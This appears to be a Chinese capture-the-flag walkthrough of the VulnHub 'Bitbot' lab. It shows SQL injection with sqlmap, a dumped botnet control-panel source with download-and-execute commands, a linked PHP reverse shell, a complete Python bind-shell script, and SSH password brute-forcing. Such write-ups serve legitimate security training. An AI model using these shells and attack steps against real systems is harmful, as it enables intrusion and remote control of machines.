# 下载地址

    
    
    https://download.vulnhub.com/botchallenges/Bitbot.VulnVM-disk1.vmdk.7z
    

# **实战演练**

下载下来之后，把它添加硬盘上去

![image.png](https://image.3001.net/images/20190804/1564876517_5d461ee579c3d.png)  

使用netdiscover进行查找靶机的IP

![image.png](https://image.3001.net/images/20190804/1564876707_5d461fa316f04.png)使用nmap对靶机系统进行端口扫描

![image.png](https://image.3001.net/images/20190804/1564876815_5d46200fefb23.png)打开浏览器

![image.png](https://image.3001.net/images/20190804/1564876899_5d4620635c851.png)  

有一个超链接的指引，不过是403

![image.png](https://image.3001.net/images/20190804/1564876926_5d46207e26d21.png)爆破web目录，找到了一个admin.php

![image.png](https://image.3001.net/images/20190804/1564877038_5d4620eef2c49.png)![image.png](https://image.3001.net/images/20190804/1564877074_5d46211286273.png)SQLMAP走起

    
    
    POST /admin.php HTTP/1.1
    Host: 192.168.0.101
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Referer: http://192.168.0.101/admin.php
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 29
    Connection: close
    Cookie: PHPSESSID=pplr8tr3t0333j40ku6k9uq7r7
    Upgrade-Insecure-Requests: 1
    
    login=1&username=1&password=1

不过是失败的=-=

![image.png](https://image.3001.net/images/20190804/1564877163_5d46216b0ab38.png)根据这个靶机的wiki找到了一个页面存在SQL注入漏洞

![image.png](https://image.3001.net/images/20190804/1564877784_5d4623d80f9db.png)对这个页面进行注入

``

`gate2.php?windows=Windows&country=US&hwid=101&connection=0&version=100&btc=all&sysinfo=Some+Info  
`

``

``

``

有两个参数存在注入  
![image.png](https://image.3001.net/images/20190804/1564878159_5d46254f912e0.png)

查看admin.php文件

![image.png](https://image.3001.net/images/20190804/1564878297_5d4625d9cb3e4.png)admin.php

    
    
    root@kali:~# cat /root/.sqlmap/output/192.168.0.101/files/_var_www_admin.php
    <?php
    require_once 'config.php';
    include 'loginheader.php';
    include 'header.php';
    include 'submit.php';
    echo'
    <table class="tborder" border="0" cellpadding="4" cellspacing="0" style="">
    
    <thead>
    <tr>
    <td class="thead" colspan="8">
    <div><strong>Bot List</strong></div>
    </td>
    </tr>
    </thead>
    
    <tbody style="" id="cat_1_e">
    <tr>
    <td class="tcat" style="white-space: nowrap;" align="center" width="20"><span class="smalltext"><strong>ID</strong></span></td>
    <td class="tcat" style="white-space: nowrap;" align="center" width="50"><span class="smalltext"><strong>IPv4 Address</strong></span></td>
    <td class="tcat" style="white-space: nowrap;" align="center" width="60"><span class="smalltext"><strong>Operation System</strong></span></td>
    <td class="tcat" style="white-space: nowrap;" align="center" width="60"><span class="smalltext"><strong>Cores</strong></span></td>
    <td class="tcat" style="white-space: nowrap;" align="center" width="50"><span class="smalltext"><strong>GPU</strong></span></td>
    <td class="tcat" style="white-space: nowrap;" align="center" width="60"><span class="smalltext"><strong>Mining Status</strong></span></td>
    <td class="tcat" style="white-space: nowrap;" align="center" width="60"><span class="smalltext"><strong>Outgoing command</strong></span></td>
    <td class="tcat" style="white-space: nowrap;" align="center" width="50"><span class="smalltext"><strong>Status</strong></span></td></tr>';
    
    $startlimit = '0';
    
    if (isset($_GET['botlist']) && isset($_GET['page']) && isset($_GET['last']))
    {
    	if (intval($_GET['page']) == 1)
    	{	
    	$startlimit = 0;
    	}
    	else
    	{
    	$startlimit = intval($_GET['last']);
    	}
    }
    
    	if ($SQL_CONNECTION)
    	{
    		
    
    		mysql_select_db($SQL_DATABASE,$SQL_CONNECTION);
    		$sql = "SELECT * FROM `bots` WHERE dead != '1' ORDER by id limit " . $startlimit . "," . "$BOT_PAGE_MAX";
    
    		$query = mysql_query($sql);
    			
    		while($row = mysql_fetch_assoc($query))
    		{
    			$dead = $row['dead'];
    			$hwid = $row['hwid'];
    			$id = $row['id'];
    			$cmd = $row['cmd'];
    			$ip = $row['ip'];
    			$win = $row['win'];
    			$now = strtotime(date('Y-m-d H:i:s'));
    			$online = strtotime($row['online']);
    			$min = $BOT_CHECKIN_INTERVAL;
    			$gap = $now - $min;
    			if($online >= $gap){ $active = '<font color="#00CC00">Online</font>';} else{ $active = '<font color="#FF0000">Offline</font>'; mysql_query("update `bots` set `btc` = '0' where `hwid` = '$hwid'");};
    			$version = $row['version'];
    			$cpugpu = explode(" ",$row['sysinfo']);
    			$cpu = $cpugpu[0];
    			$gpu = $cpugpu[1];
    			$btc = $row['btc'];
    			echo '<tr><td class="trow1" style="white-space: nowrap;" align="center">' . $id . '</td>'.
    				'<td class="trow1" style="white-space: nowrap;" align="center">' . $ip . '</td>'.
    				'<td class="trow1" style="white-space: nowrap;" align="center">' . $win . '</td>'.
    				'<td class="trow1" style="white-space: nowrap;" align="center">' . $cpu . '</td>'.
    				'<td class="trow1" style="white-space: nowrap; max-width: 100px; overflow:hidden;" align="center">' . $gpu . '</td>'.
    				'<td class="trow1" style="white-space: nowrap;" align="center">'; if($btc == "1"){echo "Yes";} else{ echo "No"; }; echo '</td>'.
    				'<td class="trow1" style="white-space: nowrap;" align="center">' . $cmd . '</td>'.
    				'<td class="trow1" style="white-space: nowrap;" align="center">' . $active . '</td><tr>';
    		}
    	}
    
    echo '
    </tbody>
    </table>';
    
    $sql = "SELECT * FROM `bots`";
    $query = mysql_query($sql);
    $rows = round(mysql_numrows($query) / intval($BOT_PAGE_MAX), 0) + 1;
    $lastint = 0;
    for($i=1;$i<$rows;$i++)
    {
    	echo '<a href="./admin.php?botlist=1&page=' . $i . '&last=' . ($lastint * intval($BOT_PAGE_MAX)) . '">' . $i . ',</a>';
    	$lastint++;
    } 
    
    echo '<br><br>
    
    <table class="tborder" border="0" cellpadding="4" cellspacing="0">
    <thead>
    <tr>
    <td class="thead" colspan="3">
    <div><strong>Add Command</strong></div>
    </td>
    </tr>
    </thead>
    
    <tbody style="" id="cat_1_e">
    <tr>
    <td class="tcat" style="white-space: nowrap;" align="center"><span class="smalltext"><strong>Bot ID</strong></span></td>
    <td class="tcat" style="white-space: nowrap;" align="center"><span class="smalltext"><strong>Command</strong></span></td></tr>
    
    <tr>
      <form action="admin.php" method="get">
      <input name="addcommand" value="1"type="hidden">
      
    <td class="trow1" style="white-space: nowrap;" align="center">';		
    echo' <select name="botid" >
    <option value="">Choose</option>
    <option value="all">All</option>';
    if ($SQL_CONNECTION)
    	{
    		mysql_select_db($SQL_DATABASE,$SQL_CONNECTION);
    		$sql = "SELECT * FROM `bots` ORDER BY id WHERE dead != '1'";
    		$query = mysql_query($sql);
    		while($row = mysql_fetch_assoc($query))
    		{
        	$id=$row["id"]; 
      		echo "<OPTION VALUE=".$id.">".$id."</option>"; 	
    		}
    	} 
    echo'
    </select> 
    </td>
    <td class="trow1" white-space: nowrap;" align="Left">
    <input class="textbox" name="newcommand" style=" width: 85%; margin-top: 4px; margin-left: 15px; margin-right: 15px;" type="text" />
    				<input class="button" value="Add" type="submit"></form>
    </td></tr>
    <tr>
    <td class="tcat" style="white-space: nowrap;" align="center"><span class="smalltext"><strong>Start ID | Stop ID</strong></span></td>
    <td class="tcat" style="white-space: nowrap;" align="center"><span class="smalltext"><strong>Command</strong></span></td></tr>
    <tr>
      <form action="admin.php" method="get">
      <input name="addcommand" value="1" type="hidden">
      
    <td class="trow1" style="white-space: nowrap;" align="center">';		
    echo' <select name="startid" >
    <option value="">Choose</option>';
    if ($SQL_CONNECTION)
    	{
    		mysql_select_db($SQL_DATABASE,$SQL_CONNECTION);
    		$sql = "SELECT * FROM `bots` ORDER BY id";
    		$query = mysql_query($sql);
    		while($row = mysql_fetch_assoc($query))
    		{
        	$id=$row["id"]; 
      		echo "<OPTION VALUE=".$id.">".$id."</option>"; 	
    		}
    	} 
    echo'
    </select> 		
    <select name="stopid" >
    <option value="">Choose</option>';
    if ($SQL_CONNECTION)
    	{
    		mysql_select_db($SQL_DATABASE,$SQL_CONNECTION);
    		$sql = "SELECT * FROM `bots` ORDER BY id";
    		$query = mysql_query($sql);
    		while($row = mysql_fetch_assoc($query))
    		{
        	$id=$row["id"]; 
      		echo "<OPTION VALUE=".$id.">".$id."</option>"; 	
    		}
    	} 
    echo'
    </select> 
    </td>
    <td class="trow1" white-space: nowrap;" align="Left">
    <input class="textbox" name="newcommand" style=" width: 85%; margin-top: 4px; margin-left: 15px; margin-right: 15px;" type="text" />
    				<input class="button" value="Add" type="submit"></form>
    </td></tr>
    </tbody></table>
    
    <br><br>
    
    <!-- Command List -->
    
    <table class="tborder" border="0" cellpadding="4" cellspacing="0">
    <thead>
    <tr>
    <td class="thead" colspan="4">
    <div><strong>Command List</strong></div>
    </td>
    </tr>
    </thead>
    
    <tbody style="" id="cat_1_e">
    <tr>
    <td class="tcat" style="white-space: nowrap;" align="center" width="40"><span class="smalltext"><strong>Command</strong></span></td>
    <td class="tcat" style="white-space: nowrap;" align="center" width="50"><span class="smalltext"><strong>Command Description</strong></span></td>
    <td class="tcat" style="white-space: nowrap;" align="center" width="55"><span class="smalltext"><strong>Command Options</strong></span></td>
    <td class="tcat" style="white-space: nowrap;" align="center" width="60"><span class="smalltext"><strong>Command Example</strong></span></td>
    </tr>
    
    <tr><td class="trow1" style="white-space: nowrap;" align="center">' . $CMD_DOWNLOAD . '</td>'.
    '<td class="trow1" style="white-space: nowrap;" align="center"> Downloads and Executes a File</td>'.
    '<td class="trow1" style="white-space: nowrap;" align="center">' . $CMD_DOWNLOAD . ' [URL]</td>'.
    '<td class="trow1" style="white-space: nowrap;" align="center">' . $CMD_DOWNLOAD . ' http://www.site.com/file.exe</td>
    
    <tr><td class="trow1" style="white-space: nowrap;" align="center">' . $CMD_UPDATE . '</td>'.
    '<td class="trow1" style="white-space: nowrap;" align="center"> Updates Bot With New File</td>'.
    '<td class="trow1" style="white-space: nowrap;" align="center">' . $CMD_UPDATE . ' [URL]</td>'.
    '<td class="trow1" style="white-space: nowrap;" align="center">' . $CMD_UPDATE . ' http://www.site.com/file.exe</td>
    
    <tr><td class="trow1" style="white-space: nowrap;" align="center">' . $CMD_REMOVE . '</td>'.
    '<td class="trow1" style="white-space: nowrap;" align="center"> Removes Bot From System</td>'.
    '<td class="trow1" style="white-space: nowrap;" align="center">' . $CMD_REMOVE . '</td>
    <td class="trow1" style="white-space: nowrap;" align="center">' . $CMD_REMOVE . '</td>
    
    <tr><td class="trow1" style="white-space: nowrap;" align="center">' . $CMD_STOPBTC . '</td>'.
    '<td class="trow1" style="white-space: nowrap;" align="center"> Stops Bitcoin mining</td>'.
    '<td class="trow1" style="white-space: nowrap;" align="center">' . $CMD_STOPBTC . '</td>
    <td class="trow1" style="white-space: nowrap;" align="center">' . $CMD_STOPBTC . ' </td>
    
    <tr><td class="trow1" style="white-space: nowrap;" align="center">' . $CMD_BTC . '</td>'.
    '<td class="trow1" style="white-space: nowrap;" align="center"> Starts Bitcoin mining</td>'.
    '<td class="trow1" style="white-space: nowrap;" align="center">' . $CMD_BTC . '</td>
    <td class="trow1" style="white-space: nowrap;" align="center">' . $CMD_BTC . ' </td>
    
    </tbody></table>
    <br><br>
    
    
    <!-- Footer -->';
    
    include 'footer.php';
    
    ?>
    root@kali:~# 
      
    

config.php

![image.png](https://image.3001.net/images/20190804/1564878472_5d4626888d26b.png)控制面板登录信息

``

`$ADMIN_USER_NAME = 'botter'; //panel username`

``

`$ADMIN_PASSWORD = 'IF I CAME UP WITH UNIQUE PASSWORDS, I WOULD BE HOME BY
NOW'; //panel password`

``

登录成功

![image.png](https://image.3001.net/images/20190804/1564878625_5d4627218f6c2.png!)  

这里面有可以下载文件的漏洞

![image.png](https://image.3001.net/images/20190804/1564878907_5d46283b50a20.png)下载[反弹shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)，修改IP和端口

![image.png](https://image.3001.net/images/20190804/1564879073_5d4628e1130b0.png!small)启动http服务器

![image.png](https://image.3001.net/images/20190804/1564879162_5d46293aabb29.png)下载shell

![image.png](https://image.3001.net/images/20190804/1564879226_5d46297a85ff0.png)  

发现不行，好像由于是之前SQLMAP跑的时候，跑死了，我重启了一下靶机

![image.png](https://image.3001.net/images/20190804/1564880252_5d462d7c7663e.png!)![image.png](https://image.3001.net/images/20190804/1564880285_5d462d9d6926b.png)

有下载记录  
![image.png](https://image.3001.net/images/20190804/1564880461_5d462e4dcbeeb.png!small)  

我重新发出了命令，但我仍然无法让它正常工作。

然后我决定稍微改变一下，而不是尝试执行反向shell，我想我会尝试一个绑定shell，这会打开一个我可以netcat到的端口。

我使用了以下python bind-shell脚本并将其保存为python-bind.py，然后重新发出命令以上载此文件并执行它。

    
    
    #simple python bind shell
    import os,sys,socket
     
    ls = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    print '-Creating socket..'
    port = 31337
    try:
    	ls.bind(('', port))
    	print '-Binding the port on ' 
    	ls.listen(1)
    	print '-Listening, '
    	(conn, addr) = ls.accept()
    	print '-Waiting for connection...'
    	cli= conn.fileno()
    	print '-Redirecting shell...'
    	os.dup2(cli, 0)
    	print 'In, '
    	os.dup2(cli, 1)
    	print 'Out, '
    	os.dup2(cli, 2)
    	print 'Err'	
    	print 'Done!'
    	arg0='/bin/sh'
    	arg1='-a'
    	args=[arg0]+[arg1]
    	os.execv(arg0, args)
    except(socket.error):
    	print 'fail\n'
    	conn.close()
    	sys.exit(1)

使用nmap扫描，发现端口开启了

![image.png](https://image.3001.net/images/20190804/1564881052_5d46309c4ef51.png)使用nc进行连接

![image.png](https://image.3001.net/images/20190804/1564881122_5d4630e26bd61.png)  

![image.png](https://image.3001.net/images/20190804/1564881336_5d4631b8995f4.png)他这个命令是随机生成一个密码重置

![image.png](https://image.3001.net/images/20190804/1564881561_5d463299b8808.png)唯一变化就是最后两个数字

![image.png](https://image.3001.net/images/20190804/1564881601_5d4632c109512.png)也就是说，它的root密码就是前面那些字符+随机两位数字，我们用python生成一下字典

![image.png](https://image.3001.net/images/20190804/1564881939_5d46341322a8a.png)爆破ssh

![image.png](https://image.3001.net/images/20190804/1564882525_5d46365d34e49.png)成功登录

![image.png](https://image.3001.net/images/20190804/1564882562_5d46368277ed7.png)  

